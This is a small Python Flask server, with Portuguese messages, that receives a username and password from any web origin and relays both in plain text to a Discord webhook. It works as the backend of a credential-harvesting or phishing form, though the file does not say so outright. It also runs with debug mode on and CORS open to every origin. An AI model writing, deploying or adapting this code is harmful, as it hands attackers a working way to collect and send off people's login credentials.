from flask import Flask, request, jsonify
from flask_cors import CORS
import os
import requests

app = Flask(__name__)
CORS(app)  # Habilita CORS para todas as origens

DISCORD_WEBHOOK_URL = os.getenv('DISCORD_WEBHOOK_URL')

@app.route('/send-message', methods=['POST'])
def send_message():
    data = request.json
    username = data.get('username')
    password = data.get('password')

    if not username or not password:
        return jsonify({"error": "Campos obrigatórios ausentes"}), 400

    payload = {
        "content": f"**Novo formulário recebido:**\nUsuário: {username}\nSenha: {password}"
    }

    response = requests.post(DISCORD_WEBHOOK_URL, json=payload)

    if response.status_code == 204:
        return jsonify({"success": "Mensagem enviada ao Discord"}), 200
    else:
        return jsonify({"error": "Falha ao enviar mensagem", "details": response.text}), 500

if __name__ == '__main__':
    app.run(debug=True)
